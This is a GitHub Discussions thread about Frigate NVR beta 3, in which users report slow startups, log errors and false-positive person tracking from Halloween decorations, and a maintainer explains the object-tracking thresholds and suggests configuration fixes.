| hey, what I potentially makes wrong as Do not get boxes on snapshot? For API calls I do use Postman at the moment. [image](https://private-user-images.githubusercontent.com/18627339/278992049-143d767f-f715-4b71-8bc4-f690b0e43e04.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xODYyNzMzOS8yNzg5OTIwNDktMTQzZDc2N2YtZjcxNS00YjcxLThiYzQtZjY5MGIwZTQzZTA0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNhNmM3OTYyOGJhNzNlYjlkNTM1N2YwNDdiMmMxY2Q2ZDJjYjE1Zjg4MTczN2I4NjBiMDU5ZjUyYTA4Y2RlMzEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.GjTLv4sH9J_QwEPJTL6nz7_uGr18zr1DXOToqfSpUxs) |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 30, 2023](#discussioncomment-7423656) Collaborator Author Sponsor

 -

| I found a small casting issue that will be fixed  [Screen Shot 2023-10-30 at 06 48 17 AM](https://private-user-images.githubusercontent.com/14866235/279061206-b2f57586-b97b-41cc-899e-467b6e3a7ce9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNDg2NjIzNS8yNzkwNjEyMDYtYjJmNTc1ODYtYjk3Yi00MWNjLTg5OWUtNDY3YjZlM2E3Y2U5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTE0VDIwMjYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEwOTJkNmE5NTViZWE1ZmFkYTQwNjY2NTNjNjdmYTIwZTg0MGI1NGFjNTBjNDllMjAxZDI4ODNhM2Y1MDRjZTEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.CnKvY0URGCGGWe1mdnKwFa4H8fYmWrnZp0ktEZXutiU) |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [Oct 30, 2023](#discussioncomment-7426700)

 -

| Anyone else having Frigate never loading after upgrading to beta3 from beta2? I seem to see nothing in my logs, but haven't had time to dig deeper yet... reverting to beta2 got me going again  frigate | s6-rc: info: service s6rc-fdholder: starting frigate | s6-rc: info: service s6rc-oneshot-runner: starting frigate | s6-rc: info: service s6rc-oneshot-runner successfully started frigate | s6-rc: info: service fix-attrs: starting frigate | s6-rc: info: service s6rc-fdholder successfully started frigate | s6-rc: info: service fix-attrs successfully started frigate | s6-rc: info: service legacy-cont-init: starting frigate | s6-rc: info: service legacy-cont-init successfully started frigate | s6-rc: info: service log-prepare: starting frigate | s6-rc: info: service log-prepare successfully started frigate | s6-rc: info: service nginx-log: starting frigate | s6-rc: info: service go2rtc-log: starting frigate | s6-rc: info: service frigate-log: starting frigate | s6-rc: info: service go2rtc-log successfully started frigate | s6-rc: info: service go2rtc: starting frigate | s6-rc: info: service nginx-log successfully started frigate | s6-rc: info: service frigate-log successfully started frigate | s6-rc: info: service go2rtc successfully started frigate | s6-rc: info: service go2rtc-healthcheck: starting frigate | s6-rc: info: service frigate: starting frigate | s6-rc: info: service go2rtc-healthcheck successfully started frigate | s6-rc: info: service frigate successfully started frigate | s6-rc: info: service nginx: starting frigate | s6-rc: info: service nginx successfully started frigate | s6-rc: info: service legacy-services: starting frigate | 2023-10-30 12:56:56.745896607 [INFO] Preparing Frigate... frigate | 2023-10-30 12:56:56.749064690 [INFO] Starting NGINX... frigate | 2023-10-30 12:56:56.750735683 [INFO] Preparing go2rtc config... frigate | s6-rc: info: service legacy-services successfully started frigate | 2023-10-30 12:56:56.764845967 [INFO] Starting Frigate... frigate | 2023-10-30 12:56:57.290049604 [INFO] Not injecting WebRTC candidates into go2rtc config as it has been set manually frigate | 2023-10-30 12:56:57.331984269 [INFO] Starting go2rtc... frigate | 2023-10-30 12:56:57.421366881 12:56:57.421 INF go2rtc version 1.8.1 linux/amd64 frigate | 2023-10-30 12:56:57.421835765 12:56:57.421 INF [api] listen addr=0.0.0.0:1984 frigate | 2023-10-30 12:56:57.422922979 12:56:57.422 INF [rtsp] listen addr=0.0.0.0:8554 frigate | 2023-10-30 12:56:57.423308932 12:56:57.423 INF [webrtc] listen addr=0.0.0.0:8555/tcp frigate | 2023-10-30 12:56:59.175877432 2023/10/30 12:56:59 [error] 147#147: \*1 connect() failed (111: Connection refused) while connecting to upstream, client: 10.10.22.11, server: , request: "GET /api/stats HTTP/1.1", upstream: "<http://127.0.0.1:5001stats>", host: "10.10.22.11:5000" frigate | 2023-10-30 12:56:59.311267449 [2023-10-30 12:56:59] frigate.app INFO : Starting Frigate (0.13.0-cd64399) frigate | 2023-10-30 12:56:59.311428009 [2023-10-30 12:56:59] frigate.app INFO : Creating directory: /config/model\_cache frigate | 2023-10-30 12:57:01.431532906 [2023-10-30 12:57:01] peewee\_migrate.logs INFO : Starting migrations frigate | 2023-10-30 12:57:01.437746456 [2023-10-30 12:57:01] peewee\_migrate.logs INFO : There is nothing to migrate frigate | 2023-10-30 12:57:04.174080061 2023/10/30 12:57:04 [error] 147#147: \*1 connect() failed (111: Connection refused) while connecting to upstream, client: 10.10.22.11, server: , request: "GET /api/stats HTTP/1.1", upstream: "<http://127.0.0.1:5001stats>", host: "10.10.22.11:5000" frigate | 2023-10-30 12:57:06.747034137 [INFO] Starting go2rtc healthcheck service... |
| --- |

Beta
Was this translation helpful?
Give feedback.

2
 You must be logged in to vote

All reactions

11 replies

Show 6 previous replies

[![@YBonline](https://avatars.githubusercontent.com/u/11162258?s=60&v=4)](/YBonline)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [YBonline](/YBonline) [Nov 5, 2023](#discussioncomment-7482047)

 -

| To be clear, it was 3 hours the first time. Subsequent startups seem to take 10-15 minutes on the same version. After upgrading to another new dev version I let it go 30 minutes and gave up and reverted since I was busy. The events page was also super sluggish on the last dev version I ran. Beta 2 startup time is 1-2 minutes and events page is quite snappy. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 5, 2023](#discussioncomment-7482051) Collaborator Author Sponsor

 -

| Are you defining the camera detect resolutions in your config? In beta2 I'd expect the startup time to be basically instant unless you are not defining detect resolutions in which case opencv has to be used to pull them in.  Based on what you're saying though, it will likely make sense to limit the number of timeline entries processed on each startup and automatic background update of the region grid |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@YBonline](https://avatars.githubusercontent.com/u/11162258?s=60&v=4)](/YBonline)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [YBonline](/YBonline) [Nov 5, 2023](#discussioncomment-7482091)

 -

| I am defining detect resolutions in config, I am saying startup time as till birdseye starts working and cameras streams are all loaded and recording. The 1-2 minute startup I had before was on par with the fastest of any other software I've tried (I tried Shinobi and iSpy and Blue Iris before settling on Frigate). Most of my streams are loaded over a VPN so I don't know if that slows it down, but also on startup I do notice CPU is at 100% for quite some time on all 32 cores (it settles down to about ~50% usage once booted), so it may just be a resource limitation (again, not unique to Frigate).  Email just went through, I just sent another with my latest config file but I don't think I've updated it since the last time you've helped me! |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Nov 6, 2023](#discussioncomment-7482147) Collaborator Author Sponsor

 -

| Yeah, that explains it a bit better, I have a couple changes that should help with this |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@YBonline](https://avatars.githubusercontent.com/u/11162258?s=60&v=4)](/YBonline)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [YBonline](/YBonline) [Nov 7, 2023](#discussioncomment-7502275)

 -

| [@niyazFattahov](https://github.com/niyazFattahov) I believe Nick got the issues I was having resolved in [cc5357a](https://github.com/blakeblackshear/frigate/pkgs/container/frigate/145118032?tag=dev-cc5357a)  You may have a one time startup time of a few hours but after that it should be snappy again once the DB changes get applied. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [YBonline](/YBonline) [Oct 30, 2023](#discussioncomment-7426844)

 -

| If you have lots of events it may be the region grid being generated.  I have a giant shit ton of events lol. I left it running for 15 minutes with no output, how long should I try leaving it for? |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

1 reply

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 30, 2023](#discussioncomment-7426863) Collaborator Author Sponsor

 -

| it can depend on a lot of things, I tested it with my setup that had a few thousand events and it only took a few seconds. Based on your number of cameras and events it may be longer. If you want you can enable debug logs for `frigate.util.object` and it will give more info for what is going on |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [chrisandsally](/chrisandsally) [Oct 30, 2023](#discussioncomment-7427071)

 -

| Hi, Seen this in the log, anything to be concerned on or checked? Nothing rebooted or any problem identified on my network at the time.  2023-10-30 17:13:21.574932954 [2023-10-30 17:13:21] ws4py ERROR : Failed to receive data 2023-10-30 17:13:21.574937248 Traceback (most recent call last): 2023-10-30 17:13:21.574939390 File "/usr/local/lib/python3.9/dist-packages/ws4py/websocket.py", line 394, in once 2023-10-30 17:13:21.574941028 b = self.sock.recv(self.reading\_buffer\_size) 2023-10-30 17:13:21.574942591 ConnectionResetError: [Errno 104] Connection reset by peer |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

1 reply

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 30, 2023](#discussioncomment-7427077) Collaborator Author Sponsor

 -

| we are aware of it but it is nothing to be worried about, it is not causing any problems |
| --- |

Beta
Was this translation helpful?
Give feedback.

 👍
1

All reactions

* 👍
  1

Comment options

# {{title}}

Something went wrong.

Quote reply

edited

# {{editor}}'s edit

 {{actor}} deleted this content
.

# {{editor}}'s edit

Something went wrong.

### [bagobones](/bagobones) [Oct 30, 2023](#discussioncomment-7428198)

 -

| Just put up the Halloween decorations and I am on beta 3.. object tracking might need some work.  [image](https://private-user-images.githubusercontent.com/1587701/279181717-d810ee85-9b09-459a-9043-8c3768c14841.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4MTcxNy1kODEwZWU4NS05YjA5LTQ1OWEtOTA0My04YzM3NjhjMTQ4NDEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NjUyZTZmODQ0OGVlMTg5YmY3NTJkZDgwNTAwZGNmYTI1YThjOGFhMTNiZjAxNGYzYjFlZDkwYWY0OTJhYTJlYyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.Ibu_UC8LRAHkDmIn8Ug76GRxcI_po9TTznV4pv0Hznw)  Setup.. The Orange, Green and Purple zones are required for events, and the yellow and brown/grey are included as well as required for snapshots.  [image](https://private-user-images.githubusercontent.com/1587701/279180857-e556bb59-1211-4aee-ad0b-75bd8ec377ff.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4MDg1Ny1lNTU2YmI1OS0xMjExLTRhZWUtYWQwYi03NWJkOGVjMzc3ZmYucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MjMxZWQ5ZmIxMjk4NTZmNWUzNWUzOGIxZjYzZGM2ZDBlNjUxMjg1MmE3NzQ3MDU0ZTdlOTEwMzkxZTAxNjQwNSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.iTs5OCRGcsEWsrfiQeTsMakd5O3bcy053vegcVy_jv4)  Top half of this area is already motion masked due to the sun and birds, is is my revised motion mask now the hanging decoration was poking just below it when this event happened last night.  [image](https://private-user-images.githubusercontent.com/1587701/279184276-bc510105-60ba-45c2-804f-5e3a8fe42060.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4NDI3Ni1iYzUxMDEwNS02MGJhLTQ1YzItODA0Zi01ZTNhOGZlNDIwNjAucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9M2VmMDRkYzIyMzZiMmQ5NjdiODk4NWM4MjdmZjQ5MDk5Y2UxYjJmZjJiZjQyZjcxYjI1MmM3ZDI1ZmZmMDY0MSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.Ey7uxINAldc7pzVKxCRYaG7FWCUB_K6GTfD99sBrd2g)  Yet this flying "person" filled up my event list last night as he "entered and left" those required zones  [image](https://private-user-images.githubusercontent.com/1587701/279181125-f9bd50c2-167e-4fe7-a0c7-dda0cbd2af8a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4MTEyNS1mOWJkNTBjMi0xNjdlLTRmZTctYTBjNy1kZGEwY2JkMmFmOGEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MTRiMGQ2YjU4OTI1MDgwZjQyMTExZTNjZjRlNjdiOTNkOTcwNzgxZTZiOGU2ZDI0OGQ2YTgwMTE0M2I5Y2FjMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.UmXoTNpY_cCkwu5z0dLYFkVTz3IlocXXWYeFY2VpRJw)  Tracking moved to the trees [image](https://private-user-images.githubusercontent.com/1587701/279181294-cc7cd35c-501c-47f9-97c8-076b7c3f2df3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4MTI5NC1jYzdjZDM1Yy01MDFjLTQ3ZjktOTdjOC0wNzZiN2MzZjJkZjMucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZjdmNjM3YWVkMjg2OGRjMmRhNWJlMzdmZTU2YjVjMDE0ODkyNTcwY2ZmMWNkNWI5Y2E1MTQ2ODBmYjZjYTJjOCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.9Jh4bqlbeKCQ63vjq6j4hH6zBxiHVM2pX_pvw-gEfI0) [image](https://private-user-images.githubusercontent.com/1587701/279181390-31cdcd99-a92c-45cd-af39-561250ab9bb1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4MTM5MC0zMWNkY2Q5OS1hOTJjLTQ1Y2QtYWYzOS01NjEyNTBhYjliYjEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9M2M3ZjU4NjQ2YmQwN2Q5MmQ2NzdlMmE5YmZkMDc2NDQwM2U4MWI3ZTU4OGU3YzE0ZjQ1NzlhMDMyMzU0N2QxOSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.jSVW0dPWrr0PA8nhyFjqTLPA0gJfVsxW4etZHETqeRM) [image](https://private-user-images.githubusercontent.com/1587701/279181466-e5c8381d-ee14-4c5e-a256-17ba8d644f8b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4MTQ2Ni1lNWM4MzgxZC1lZTE0LTRjNWUtYTI1Ni0xN2JhOGQ2NDRmOGIucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZGYwMzA0ZWE2NGQ4MDMzZjcyYmJjNTNhYWNiMTQ2Mzk5ZWE5N2JmMGFlNDk1MzhiZjIxYzkxZDhjNzE4MTNhYSZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.bmh_MqiTx9CK_eUxO-WrNrX1UNfUL1QN2z0_bVqkzVw) also this small object [image](https://private-user-images.githubusercontent.com/1587701/279181567-7cf5a293-5e9b-416e-a02e-5d8bf2f45885.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODY2OTksIm5iZiI6MTczNjg4NjM5OSwicGF0aCI6Ii8xNTg3NzAxLzI3OTE4MTU2Ny03Y2Y1YTI5My01ZTliLTQxNmUtYTAyZS01ZDhiZjJmNDU4ODUucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExNCUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTRUMjAyNjM5WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9ZjA4OTgxYWZjMTBlZDM5NzBkNjBiNWJiZTA0NDIwNzZlNDRlZTE0NDM2Mjk3ZjgxMzZlNTAzNGYzYTdkMDU0YyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.EGN74fIO2d0nLFreTnfRN_QnkQzpLrYoxWPvO7MN8Mo)  Guess he was busy possessing objects.  Reality here is the wind however it doesn't leave me with much option to filter this out.   1. The trees normally don't detect as people, I already tuned the thresholds down for those. This decoration has also detected as high as 83% person and people walking up the side walk are 75+ so I can't really set it higher. (maybe I need to try frigate plus, this is just the default model) 2. I can't set people area smaller than the trees as I have children and people at the end of the driveway walking up that will be about the same size as the trees but the smallest object here I can probably tune out. 3. I already have most of the upper part of the screen motion masked but I have increased that more as anything I want tracked will be walking anyway in the bottom portion of the screen.   The detection moving to such far away and different objects seems like a object tracking issue to me. Even with the false positive the fact it persistent onto several different objects is problematic. Maybe setting a sky zone with a higher person threshold and maybe upping my min score over all will help but I find with lower min\_score my persistence suffers with people and I way more individual events  global settings  ``` objects:   track:     - person   filters:     person:             min_score: 0.55       threshold: 0.74     car:       min_score: 0.55       threshold: 0.7  ```  doorbell config below  ``` cameras:   doorbell:     ui:       order: 0     ffmpeg:       inputs:         - path: rtsp://127.0.0.1:8554/doorbell           input_args: preset-rtsp-restream           roles:             - record             - detect             - audio     detect:       width: 1440       height: 1080       fps: 10     objects:       track:         - person         - car         - dog         - cat         - bear       filters:         car:           min_area: 5000           mask:             - 98,428,266,623,102,666     audio:       enabled: True       min_volume: 200       listen:         - honk         - siren         - police_car             - fire_engine         - ambulance         - emergency_vehicle         - reversing_beeps         - ice_cream_truck         - fire_alarm         - alarm         - scream         - crying         - speech         - yell         - whispering         - knock         - tap         - slam         - bang         - thunk         - thump         - smash         - door         - crack         - glass       filters:         knock:           threshold: 0.7     motion:       threshold: 40       mask:          - 1440,0,1440,408,0,408,0,0          - 1034,515,1148,515,1144,364,1120,243,1012,265     snapshots:       enabled: True       required_zones:           - front_porch           - front_walk           - driveway           - front_yard           - road     record:       enabled: True       events:         pre_capture: 5         required_zones:           - front_porch           - front_walk           - driveway     zones:       front_porch:         coordinates: 320,1080,1329,1080,1094,925,993,854,434,923,0,910,0,1080         objects:           - person           - dog           - cat           - bear       front_walk:         coordinates: 922,869,946,670,910,656,693,768,493,842,345,849,408,904         objects:           - person           - dog           - cat           - bear       driveway:         coordinates: 1063,588,1051,691,780,619         objects:           - person           - car           - dog           - cat           - bear       front_yard:         coordinates: 414,635,747,623,907,651,694,761,487,845,77,861         objects:           - person           - dog           - cat           - bear       road:         coordinates: 721,607,759,622,472,620,453,613         objects:           - person           - car  ``` |
| --- |

Beta
Was this translation helpful?
Give feedback.

1
 You must be logged in to vote

All reactions

3 replies

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 30, 2023](#discussioncomment-7428268) Collaborator Author Sponsor

 -

| Object tracking like this is very difficult issue, you can have cases where someone opens a car door and is obstructed that you would want to be detected as the same person even if the shape (legs underneath the car door) is different. But then you have cases like you are showing where you would want the distance to be different. It is worth noting that if you had these "person" objects detected separately then you'd just have even more events as each one would be its own.  It is also worth noting that the improvements to object detection and object tracking had nothing to do with the distance logic (which is what decides if a detected object is the same or a different object) or directly reducing false positives. It was mostly around initial regions when motion is detected, and true positive stationary objects like cars being detected more accurately.  With the COCO model to me it seems like a lot of these false positives could be improved by using a person object mask in the sky (where no real person would be) and a small person mask at the bottom center of each tree. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@bagobones](https://avatars.githubusercontent.com/u/1587701?s=60&v=4)](/bagobones)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [bagobones](/bagobones) [Oct 30, 2023](#discussioncomment-7428374)

 -

| If I understand it correctly threshold will start an event but min\_score will be used to continue it correct? IE the sky object in this case exceeded the threshold but he other objects only had to exceed the min\_score correct as they where "tracked" as the same event / object? I can also try bumping up min score a little I guess.  I will try some person masks as well, however I generally try to avoid using them., |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

[![@NickM-27](https://avatars.githubusercontent.com/u/14866235?s=60&v=4)](/NickM-27)

Comment options

# {{title}}

Something went wrong.

Quote reply

#### [NickM-27](/NickM-27) [Oct 30, 2023](#discussioncomment-7428413) Collaborator Author Sponsor

 -

| yes that is correct, a median score of threshold is required for the event to be created, but min\_score is what is used to decide if the detection should be considered or immediately thrown out.  So if the min\_score is too high then lower scoring true positives may be thrown out, and if it is too low then false positives may be detected. |
| --- |

Beta
Was this translation helpful?
Give feedback.

All reactions

Comment options

# {{title}}

Something went wrong.

Quote reply

### [Oct 30, 2023](#discussioncomment-7429171)

 -

| After upgrade from beta2 to beta3 I see the following in birdseye:    Screen.Recording.2023-10-30.at.5.54.11.PM.mov     ``` mqtt:   host: mosquitto   stats_interval: 600  go2rtc:   # Custom version is mounted in /opt/frigate/config   streams:     ptz_ethernet:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0&authbasic=64 # connect directly to main camera stream for live view     ptz_wifi:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0&authbasic=64 # connect directly to main camera stream for live view     ptz_wifi_sub:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=1&authbasic=64 # connect directly to main camera stream for live view     back_porch:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0 # connect directly to main camera stream for live view     driveway:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0 # connect directly to main camera stream for live view     garage:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0 # connect directly to main camera stream for live view     front_door:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0#backchannel=0 # connect directly to main camera stream for live view, disable two-way audio     front_door_twoway:       - rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=1 # Connect to substream for lower bandwidth       - "ffmpeg:rtsp://admin:x@x:554/cam/realmonitor?channel=1&subtype=0#audio=opus"    webrtc:     candidates:       - 10.0.1.22:8555       - stun:8555  cameras:   ptz:     birdseye:       enabled: False     enabled: True     live:       stream_name: ptz_wifi     ffmpeg:       inputs:         - path: rtsp://127.0.0.1:8554/ptz_wifi # connect directly to main camera stream for recording           roles:             - record         - path: rtsp://127.0.0.1:8554/ptz_wifi_sub # connect directly to camera substream for detection           roles:             - detect     detect:      width: 640      height: 480     objects:       track:         - bird       filters:         bird:           threshold: 0.4           min_score: 0.3     record:       enabled: True       retain:           days: 5           mode: all #motion     motion:       threshold: 20 # default 30       mask:      